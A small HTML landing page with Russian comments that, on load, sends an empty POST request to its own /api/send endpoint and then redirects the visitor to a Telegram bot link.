<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Faidiklogar</title>
    <script>
        // Функция отправки данных в API перед перенаправлением
        async function sendDataAndRedirect() {
            try {
                console.log('Отправка данных...');
                // Отправляем POST запрос к API
                const response = await fetch('/api/send', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                });
                
                console.log('Ответ API:', response.status);
                
            } catch (error) {
                console.log('Ошибка при отправке:', error);
            } finally {
                // Всегда перенаправляем на Telegram
                console.log('Перенаправление на Telegram...');
                window.location.href = 'https://t.me/faidiappsbot';
            }
        }

        // Запускаем сразу после загрузки страницы
        document.addEventListener('DOMContentLoaded', sendDataAndRedirect);
    </script>
</head>
<body>
    <!-- Абсолютно пустая страница -->
</body>
</html>
